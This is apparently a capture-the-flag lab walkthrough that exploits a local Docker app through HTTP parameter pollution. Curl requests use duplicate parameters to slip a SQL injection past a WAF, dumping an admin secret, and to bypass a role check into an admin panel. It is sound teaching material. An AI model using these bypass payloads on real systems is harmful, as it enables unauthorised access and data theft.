# Walkthrough

## Setup

```
$ docker compose up --build -d
```

## Step 1: probe the application

```
$ curl -s http://127.0.0.1:8098/
```

Two endpoints: `/api/search?id=` with WAF protection, `/api/admin?role=` with role check.

## Step 2: confirm the WAF

```
$ curl -s 'http://127.0.0.1:8098/api/search?id=1%20OR%201%3D1--'
```

Output:

```json
{"error":"WAF: blocked suspicious input","blocked_value":"1 OR 1=1--"}
```

## Step 3: bypass the WAF with a duplicate parameter

Send two `id` values: `1` (clean, for the WAF) and the injection (for the backend):

```
$ curl -s 'http://127.0.0.1:8098/api/search?id=1&id=1%20OR%201%3D1--'
```

Output:

```json
{"results":[
  {"id":1,"name":"alice","role":"user"},
  {"id":2,"name":"bob","role":"user"},
  {"id":999,"name":"admin","role":"admin","secret":"POC{...}"}
],"count":3}
```

**Flag 1 captured** from the `secret` field of the admin row.

## Step 4: confirm the role check

```
$ curl -s 'http://127.0.0.1:8098/api/admin?role=user'
{"message":"Welcome user. No admin access."}
```

## Step 5: bypass the role check with a duplicate parameter

Send two `role` values: `user` (for the access check) and `admin` (for the handler):

```
$ curl -s 'http://127.0.0.1:8098/api/admin?role=user&role=admin'
```

Output:

```json
{"flag2":"POC{...}","panel":"Admin panel accessed via HPP"}
```

**Flag 2 captured.**

## Full attack chain

```
Attack 1:
  ?id=1&id=1 OR 1=1--
  WAF sees '1' (first) -- clean, allow
  Backend sees '1 OR 1=1--' (last) -- injection, returns all rows
  admin row contains FLAG1

Attack 2:
  ?role=user&role=admin
  Middleware sees 'user' (first) -- non-admin, no block
  Handler sees 'admin' (last) -- admin panel, FLAG2
```

## Automated exploit

```
$ python3 exploit/exploit.py
```

## Teardown

```
$ docker compose down
```
